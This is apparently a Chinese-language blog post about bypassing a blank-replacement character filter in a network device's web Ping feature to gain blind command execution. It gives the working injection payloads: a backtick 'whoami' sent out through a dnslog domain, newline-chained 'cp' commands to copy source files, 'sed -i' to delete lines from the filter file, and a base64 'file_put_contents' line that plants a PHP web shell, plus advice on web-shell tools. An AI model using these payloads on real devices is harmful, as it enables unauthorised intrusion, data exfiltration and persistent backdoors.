前⾔
今天遇到⼀个有意思的Linux命令执⾏绕过分享⼀下。
某⽹络设备后台有个Ping功能，命令执⾏⽆回显，使⽤
dnslog收到请求，因此icmp、dns出⽹。
但是进⼀步命令执⾏的时候发现存在很多替换为空的过滤。
第⼀步绕过，cp命令读取源码。
ping.php中存在参数过滤函数，并且使⽤ exec() 命令执⾏因此⽆回显。
根据include包含的⽂件必然能找到过滤函数所在的⽂件。
过滤如下
`whoami`.dnslog
cp ping.php ping.txt
cd ..\ncd ..\ncd ..\ncd ..\ncd model\ncp filter.php filter.txt
$val = str_replace("", "", $val);
$val = str_replace("/", "", $val);
$val = str_replace("+", "", $val);
$val = str_replace("'", "", $val);
$val = str_replace("\"", "", $val);
$val = str_replace(";", "", $val);
$val = str_replace("?", "", $val);
$val = str_replace("%", "", $val);
$val = str_replace(")", "", $val);
$val = str_replace("(", "", $val);
$val = str_replace(":", "", $val);
$val = str_replace("&", "", $val);
$val = str_replace("|", "", $val);
第⼆步绕过，sed删除过滤⾏。
which 存在wget，尝试wget发现tcp不出⽹。
后来想到sed，可以增加删除替换，但是增加和替换php代码都需要⽤到标点，于是去删除过
滤函数中的过滤代码（注意事先cp备份）。
最后，写个shell。
先写个⼀句话，phpinfo发现是php5.2的，shell连接⼯具的加密别选aes，或者直接上个⼤
⻢。
其他思路
当时另⼀个思路就是后台还有⽇志功能，可以考虑写⼊shell到⽇志⽂件，再cp到web⽬录，
因为sed成了就没去试。
想听听⼤家有什么其他的可⾏思路。
抱拳了.jpg
cd ..\ncd ..\ncd ..\ncd ..\ncd model\nsed -i 4d filter.php
cmd=file_put_contents('2.php', base64_decode('xxxxxxxx');